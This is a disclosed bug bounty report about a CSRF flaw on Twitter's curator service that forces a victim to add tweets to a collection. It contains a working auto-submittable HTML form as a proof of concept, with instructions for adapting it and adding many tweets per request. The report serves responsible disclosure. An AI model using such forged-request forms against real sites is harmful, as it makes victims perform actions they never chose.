# Add tweet to collection CSRF 

## Report Details
- **Report ID**: 100820
- **URL**: https://hackerone.com/reports/100820
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-11-21T09:39:00.270Z
- **Disclosed**: 2016-08-22T18:54:18.564Z

## Reporter
- **Username**: indoappsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
Hi Team,

I have found a CSRF vulnerability which force victim to add tweets in his collection.

HTML POC : 

<html>
<body>
<form action="https://curator.twitter.com/api/collections/STREAM/content" method="POST">
<input type="hidden" name="tweet_ids[]" value="667977435124658176">
<input type="hidden" name="collections[]" value="667916850294951936">
<input type="hidden" name="model[id]" value="STREAM">
<input type=submit>
</body>
</html>

Before using this POC change the Collection ID to your collection ID and you will see that tweet will be added into your collection.You can Also add so many tweets in one request by adding "tweet_ids" parameter multiple times.

Let me know if you need any other help from my side.

Best Regards !
Vijay Kumar 

## Attachments
No attachments
